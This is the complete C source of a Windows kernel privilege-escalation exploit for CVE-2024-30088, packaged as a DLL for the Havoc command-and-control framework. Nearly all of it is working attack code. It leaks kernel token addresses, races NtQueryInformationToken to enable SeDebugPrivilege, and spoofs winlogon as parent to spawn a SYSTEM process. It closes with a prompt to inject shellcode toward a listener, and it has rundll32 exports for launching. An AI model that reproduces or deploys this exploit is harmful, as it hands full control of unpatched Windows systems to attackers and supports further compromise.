/*
 * CVE-2024-30088 LPE Exploit - DLL for Havoc DllSpawn
 *
 * Vuln:    TOCTOU race condition in ntoskrnl!AuthzBasepCopyoutInternalSecurityAttributes
 *          NtQueryInformationToken(TokenAccessInformation) copies security attribute
 *          name to user buffer via RtlCopyUnicodeString. Racing thread redirects
 *          the Buffer pointer to TOKEN.Privileges -> enables SeDebugPrivilege
 *          -> OpenProcess(winlogon) -> parent process spoofing -> SYSTEM
 * Req:     Regular user (medium integrity), NO admin required
 * Targets: Windows 10/11 (pre-Jun 2024 patch)
 * Patched: June 2024 Patch Tuesday
 *
 * Based on: github.com/tykawaii98/CVE-2024-30088
 *
 * Build: cl.exe /O2 /MT /LD exploit_dll.cpp /Fe:cve_2024_30088.dll /link advapi32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>

#pragma comment(lib, "advapi32.lib")

#ifdef __cplusplus
extern "C" {
#endif

/* ================================================================
 * Typedefs
 * ================================================================ */
typedef NTSTATUS (NTAPI *fn_NtQueryInformationToken)(
    HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(
    ULONG, PVOID, ULONG, PULONG);

typedef struct {
    PVOID  Object;
    HANDLE UniqueProcessId;
    HANDLE HandleValue;
    ULONG  GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG  HandleAttributes;
    ULONG  Reserved;
} SYS_HANDLE_EX;

typedef struct {
    ULONG_PTR HandleCount;
    ULONG_PTR Reserved;
    SYS_HANDLE_EX Handles[1];
} SYS_HANDLE_INFO_EX;

typedef struct {
    ULONG      SecurityAttributeCount;
    LIST_ENTRY SecurityAttributesList;
    ULONG      WorkingSecurityAttributeCount;
    LIST_ENTRY WorkingSecurityAttributesList;
} AUTHZ_SECURITY_ATTRS_INFO;

/* TOKEN_ACCESS_INFORMATION: SecurityAttributes at offset 0x50 on x64 */
#define TOKEN_ACCESS_INFO_SECATTR_OFFSET 0x50

static fn_NtQueryInformationToken pNtQueryInformationToken;
static fn_NtQuerySystemInformation pNtQuerySystemInformation;

static wchar_t g_target[MAX_PATH] = L"notepad.exe";

/* ================================================================
 * FixStdout
 * ================================================================ */
static void FixStdout(void) {
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    if (!h || h == INVALID_HANDLE_VALUE) return;
    int fd = _open_osfhandle((intptr_t)h, _O_TEXT);
    if (fd < 0) return;
    _dup2(fd, _fileno(stdout));
    setvbuf(stdout, NULL, _IONBF, 0);
}

/* ================================================================
 * Get kernel pointer for a handle via SystemExtendedHandleInformation
 * ================================================================ */
static PVOID GetKernelPointer(HANDLE hValue) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;
    pNtQuerySystemInformation = (fn_NtQuerySystemInformation)
        GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!pNtQuerySystemInformation) return NULL;

    ULONG len = 0x10000;
    SYS_HANDLE_INFO_EX *pInfo = NULL;
    NTSTATUS st;

    do {
        len *= 2;
        pInfo = (SYS_HANDLE_INFO_EX*)GlobalAlloc(GMEM_ZEROINIT, len);
        if (!pInfo) return NULL;
        st = pNtQuerySystemInformation(64 /* SystemExtendedHandleInformation */,
                                       pInfo, len, &len);
        if (st == 0xC0000004L) { GlobalFree(pInfo); pInfo = NULL; }
    } while (st == 0xC0000004L);

    if (st != 0) { if (pInfo) GlobalFree(pInfo); return NULL; }

    PVOID result = NULL;
    DWORD pid = GetCurrentProcessId();
    for (ULONG_PTR i = 0; i < pInfo->HandleCount; i++) {
        if ((DWORD)(ULONG_PTR)pInfo->Handles[i].UniqueProcessId == pid &&
            pInfo->Handles[i].HandleValue == hValue) {
            result = pInfo->Handles[i].Object;
            break;
        }
    }
    GlobalFree(pInfo);
    return result;
}

/* ================================================================
 * Find PID by name
 * ================================================================ */
static DWORD FindPidByName(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/* ================================================================
 * Race thread data
 * ================================================================ */
typedef struct {
    BYTE  *RaceAddr;
    ULONGLONG TargetKernelAddr;
    volatile LONG running;
} RACE_CTX;

static DWORD WINAPI RaceThread(LPVOID param) {
    RACE_CTX *ctx = (RACE_CTX*)param;
    ULONGLONG value = ctx->TargetKernelAddr;
    while (ctx->running) {
        *(WORD*)(ctx->RaceAddr + 2)  = 2;
        *(ULONGLONG*)(ctx->RaceAddr + 8) = value;
    }
    return 0;
}

/* ================================================================
 * SYSTEM check
 * ================================================================ */
static BOOL IsSystem(void) {
    HANDLE hT = NULL; BOOL r = FALSE; DWORD sz = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hT)) return FALSE;
    GetTokenInformation(hT, TokenUser, NULL, 0, &sz);
    TOKEN_USER *tu = (TOKEN_USER*)HeapAlloc(GetProcessHeap(), 0, sz);
    if (tu && GetTokenInformation(hT, TokenUser, tu, sz, &sz)) {
        SID_IDENTIFIER_AUTHORITY a = SECURITY_NT_AUTHORITY;
        PSID s = NULL;
        if (AllocateAndInitializeSid(&a, 1, SECURITY_LOCAL_SYSTEM_RID, 0,0,0,0,0,0,0, &s)) {
            r = EqualSid(tu->User.Sid, s); FreeSid(s);
        }
    }
    if (tu) HeapFree(GetProcessHeap(), 0, tu);
    CloseHandle(hT);
    return r;
}

/* ================================================================
 * Create process with parent spoofing
 * ================================================================ */
static DWORD SpawnWithParent(HANDLE hParent, const wchar_t *target) {
    STARTUPINFOEXW si;
    PROCESS_INFORMATION pi;
    SIZE_T size = 0;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, size);
    if (!si.lpAttributeList) return 0;

    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    UpdateProcThreadAttribute(si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof(HANDLE), NULL, NULL);

    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    si.StartupInfo.lpDesktop = (LPWSTR)L"WinSta0\\Default";

    wchar_t cmd[MAX_PATH];
    lstrcpynW(cmd, target, MAX_PATH);

    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                        NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
        printf("[-] CreateProcessW: %u\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        return 0;
    }

    DWORD pid = pi.dwProcessId;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    return pid;
}

/* ================================================================
 * Core exploit
 * ================================================================ */
static BOOL DoExploit(void) {
    HANDLE hToken = NULL;
    BYTE *TokenInfo = NULL;
    DWORD InfoLen = 0x1000;
    DWORD retLen = 0;
    HANDLE hRaceThread = NULL;
    RACE_CTX raceCtx = {0};

    printf("[*] CVE-2024-30088 - ntoskrnl TOCTOU Race Condition LPE\n");
    printf("[*] Target: %S\n\n", g_target);

    if (IsSystem()) { printf("[+] Already SYSTEM!\n"); goto spawn; }

    /* 1 - Resolve NtQueryInformationToken */
    {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) { printf("[-] ntdll not found\n"); return FALSE; }
        pNtQueryInformationToken = (fn_NtQueryInformationToken)
            GetProcAddress(ntdll, "NtQueryInformationToken");
        if (!pNtQueryInformationToken) {
            printf("[-] NtQueryInformationToken not found\n");
            return FALSE;
        }
    }
    printf("[+] NtQueryInformationToken resolved\n");

    /* 2 - Leak TOKEN kernel address */
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        printf("[-] OpenProcessToken: %u\n", GetLastError());
        return FALSE;
    }

    ULONGLONG kTokenAddr = (ULONGLONG)GetKernelPointer(hToken);
    if (!kTokenAddr) {
        printf("[-] TOKEN kernel address leak failed\n");
        CloseHandle(hToken);
        return FALSE;
    }
    printf("[+] TOKEN kernel addr: 0x%llx\n", kTokenAddr);

    /* 3 - Query token security attributes */
    TokenInfo = (BYTE*)VirtualAlloc(NULL, InfoLen, MEM_COMMIT, PAGE_READWRITE);
    if (!TokenInfo) {
        printf("[-] VirtualAlloc failed\n");
        CloseHandle(hToken);
        return FALSE;
    }

    NTSTATUS st = pNtQueryInformationToken(hToken,
        (TOKEN_INFORMATION_CLASS)22 /* TokenAccessInformation */,
        TokenInfo, InfoLen, &retLen);
    if (st != 0) {
        printf("[-] NtQueryInformationToken: 0x%08x\n", (unsigned)st);
        VirtualFree(TokenInfo, 0, MEM_RELEASE);
        CloseHandle(hToken);
        return FALSE;
    }
    printf("[+] TokenAccessInformation queried (%u bytes)\n", retLen);

    /* 4 - Find security attributes name offset */
    DWORD nameOffset = 0;
    {
        AUTHZ_SECURITY_ATTRS_INFO *pSecAttrs =
            *(AUTHZ_SECURITY_ATTRS_INFO**)(TokenInfo + TOKEN_ACCESS_INFO_SECATTR_OFFSET);

        if (!pSecAttrs) {
            printf("[-] No SecurityAttributes pointer in token\n");
            VirtualFree(TokenInfo, 0, MEM_RELEASE);
            CloseHandle(hToken);
            return FALSE;
        }

        if (pSecAttrs->SecurityAttributeCount == 0) {
            printf("[-] Token has no security attributes (count=0)\n");
            printf("[-] This exploit requires tokens with security attributes\n");
            VirtualFree(TokenInfo, 0, MEM_RELEASE);
            CloseHandle(hToken);
            return FALSE;
        }

        BYTE *Flink = (BYTE*)pSecAttrs->SecurityAttributesList.Flink;
        if (!Flink) {
            printf("[-] SecurityAttributesList.Flink is NULL\n");
            VirtualFree(TokenInfo, 0, MEM_RELEASE);
            CloseHandle(hToken);
            return FALSE;
        }

        /* Name UNICODE_STRING is at Flink + 0x20 */
        nameOffset = (DWORD)((Flink + 0x20) - TokenInfo);
        printf("[+] SecurityAttributes count: %u\n", pSecAttrs->SecurityAttributeCount);
        printf("[+] Name UNICODE_STRING offset in buffer: 0x%x\n", nameOffset);
    }

    /* 5 - Setup race */
    BYTE *raceAddr = TokenInfo + nameOffset;
    /* Target: TOKEN.Privileges area (kTokenAddr + 0x40 - 4) */
    ULONGLONG targetAddr = kTokenAddr + 0x40 - 4;

    printf("[+] Race target: 0x%llx (TOKEN Privileges area)\n", targetAddr);

    raceCtx.RaceAddr = raceAddr;
    raceCtx.TargetKernelAddr = targetAddr;
    raceCtx.running = 1;

    /* Find winlogon PID before the race */
    DWORD winlogonPid = FindPidByName(L"winlogon.exe");
    if (!winlogonPid) {
        printf("[-] winlogon.exe not found\n");
        VirtualFree(TokenInfo, 0, MEM_RELEASE);
        CloseHandle(hToken);
        return FALSE;
    }
    printf("[+] winlogon.exe PID: %u\n", winlogonPid);

    /* 6 - Race loop */
    printf("[*] Starting race (TOCTOU)...\n");

    HANDLE hWinLogon = NULL;
    int maxAttempts = 50;

    for (int attempt = 0; attempt < maxAttempts; attempt++) {
        raceCtx.running = 1;
        hRaceThread = CreateThread(NULL, 0, RaceThread, &raceCtx, 0, NULL);
        if (!hRaceThread) continue;
        SetThreadPriority(hRaceThread, THREAD_PRIORITY_TIME_CRITICAL);

        for (int i = 0; i < 5000; i++) {
            pNtQueryInformationToken(hToken,
                (TOKEN_INFORMATION_CLASS)22,
                TokenInfo, InfoLen, &retLen);
        }

        raceCtx.running = 0;
        WaitForSingleObject(hRaceThread, 5000);
        CloseHandle(hRaceThread);
        hRaceThread = NULL;

        /* Check if we won the race by trying to open winlogon */
        hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonPid);
        if (hWinLogon) {
            printf("[+] Race won on attempt %d!\n", attempt + 1);
            printf("[+] Got winlogon handle: 0x%p\n", hWinLogon);
            break;
        }

        if ((attempt + 1) % 10 == 0)
            printf("[*] Attempt %d/%d...\n", attempt + 1, maxAttempts);
    }

    VirtualFree(TokenInfo, 0, MEM_RELEASE);
    CloseHandle(hToken);

    if (!hWinLogon) {
        printf("[-] Race failed after %d attempts\n", maxAttempts);
        printf("[-] System may be patched (Jun 2024) or token has no security attributes\n");
        return FALSE;
    }

    /* 7 - Spawn process as child of winlogon (inherits SYSTEM token) */
    printf("[+] Privileges escalated via race condition\n");
    printf("[*] Spawning %S as child of winlogon.exe...\n", g_target);

spawn:
    {
        DWORD childPid = 0;
        if (hWinLogon) {
            childPid = SpawnWithParent(hWinLogon, g_target);
            CloseHandle(hWinLogon);
        } else {
            /* Already SYSTEM path */
            STARTUPINFOW si2; PROCESS_INFORMATION pi2;
            ZeroMemory(&si2, sizeof(si2)); ZeroMemory(&pi2, sizeof(pi2));
            si2.cb = sizeof(si2);
            si2.lpDesktop = (LPWSTR)L"WinSta0\\Default";
            wchar_t cmd[MAX_PATH];
            lstrcpynW(cmd, g_target, MAX_PATH);
            if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                              CREATE_NEW_CONSOLE, NULL, NULL, &si2, &pi2)) {
                childPid = pi2.dwProcessId;
                CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess);
            }
        }

        if (childPid) {
            printf("\n[+] ==================================\n");
            printf("[+]  SYSTEM process created!\n");
            printf("[+]  Process: %S\n", g_target);
            printf("[+]  PID:     %u\n", childPid);
            printf("[+] ==================================\n\n");
            printf("[*] Next: shinject %u x64 <listener>\n", childPid);
            return TRUE;
        } else {
            printf("[-] Failed to spawn process\n");
            return FALSE;
        }
    }
}

/* ================================================================
 * Check mode
 * ================================================================ */
static void DoCheck(void) {
    HANDLE hToken = NULL;

    printf("[*] CVE-2024-30088 - Pre-flight Check\n\n");

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationToken = (fn_NtQueryInformationToken)
        GetProcAddress(ntdll, "NtQueryInformationToken");

    SYSTEM_INFO si; GetNativeSystemInfo(&si);
    printf("[*] Arch: %s\n",
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86");

    RTL_OSVERSIONINFOW vi = {0};
    vi.dwOSVersionInfoSize = sizeof(vi);
    typedef NTSTATUS (NTAPI *fn_RtlGetVersion)(PRTL_OSVERSIONINFOW);
    fn_RtlGetVersion pRtlGetVersion = (fn_RtlGetVersion)GetProcAddress(ntdll, "RtlGetVersion");
    if (pRtlGetVersion && pRtlGetVersion(&vi) == 0) {
        printf("[*] OS: Windows %lu.%lu Build %lu\n",
            vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
    }

    printf(IsSystem() ? "[+] SYSTEM: YES\n" : "[*] SYSTEM: NO\n");

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        printf("[-] OpenProcessToken failed\n");
        return;
    }

    ULONGLONG kTokenAddr = (ULONGLONG)GetKernelPointer(hToken);
    printf(kTokenAddr ? "[+] TOKEN kernel leak: 0x%llx\n" : "[-] TOKEN kernel leak: FAILED\n", kTokenAddr);

    if (pNtQueryInformationToken) {
        BYTE buf[0x1000];
        DWORD ret = 0;
        NTSTATUS st = pNtQueryInformationToken(hToken,
            (TOKEN_INFORMATION_CLASS)22, buf, sizeof(buf), &ret);
        if (st == 0) {
            AUTHZ_SECURITY_ATTRS_INFO *pSA =
                *(AUTHZ_SECURITY_ATTRS_INFO**)(buf + TOKEN_ACCESS_INFO_SECATTR_OFFSET);
            if (pSA && pSA->SecurityAttributeCount > 0) {
                printf("[+] Security attributes: %u (exploit viable)\n",
                    pSA->SecurityAttributeCount);
            } else {
                printf("[-] Security attributes: NONE (exploit will fail)\n");
            }
        } else {
            printf("[-] NtQueryInformationToken: 0x%08x\n", (unsigned)st);
        }
    }

    DWORD pid = FindPidByName(L"winlogon.exe");
    printf(pid ? "[+] winlogon.exe: PID %u\n" : "[-] winlogon.exe: NOT found\n", pid);

    CloseHandle(hToken);
    printf("\n[*] Check complete\n");
}

/* ================================================================
 * Args
 * ================================================================ */
static void ParseArgs(const char *args) {
    if (!args || !args[0]) return;
    while (*args == ' ' || *args == '\t') args++;
    if (strncmp(args, "run", 3) == 0) {
        const char *p = args + 3;
        while (*p == ' ' || *p == '\t') p++;
        if (*p && *p != '\r' && *p != '\n') {
            MultiByteToWideChar(CP_ACP, 0, p, -1, g_target, MAX_PATH);
            int len = lstrlenW(g_target);
            while (len > 0 && (g_target[len-1] == L' ' || g_target[len-1] == L'\r' || g_target[len-1] == L'\n'))
                g_target[--len] = 0;
        }
    }
}

/* ================================================================
 * DllMain
 * ================================================================ */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        FixStdout();
        const char *args = NULL;
        if (lpvReserved && ((const char*)lpvReserved)[0] != '\0')
            args = (const char*)lpvReserved;
        printf("[cve-2024-30088] args: %s\n\n", args ? args : "(none)");
        if (args && strncmp(args, "check", 5) == 0) DoCheck();
        else { ParseArgs(args); DoExploit(); }
        printf("\n[cve-2024-30088] Done\n");
        fflush(stdout);
    }
    return TRUE;
}

/* ================================================================
 * rundll32 exports
 * ================================================================ */
__declspec(dllexport)
void CALLBACK StartW(HWND hw, HINSTANCE hi, LPWSTR cmd, int sh) {
    (void)hw;(void)hi;(void)sh;
    FixStdout();
    char b[512]={0};
    if(cmd&&cmd[0]) WideCharToMultiByte(CP_ACP,0,cmd,-1,b,511,NULL,NULL);
    if(b[0]&&strncmp(b,"check",5)==0) DoCheck();
    else { ParseArgs(b[0]?b:NULL); DoExploit(); }
    fflush(stdout);
}

__declspec(dllexport)
void CALLBACK Start(HWND hw, HINSTANCE hi, LPSTR cmd, int sh) {
    (void)hw;(void)hi;(void)sh;
    FixStdout();
    if(cmd&&cmd[0]&&strncmp(cmd,"check",5)==0) DoCheck();
    else { ParseArgs(cmd); DoExploit(); }
    fflush(stdout);
}

#ifdef __cplusplus
}
#endif
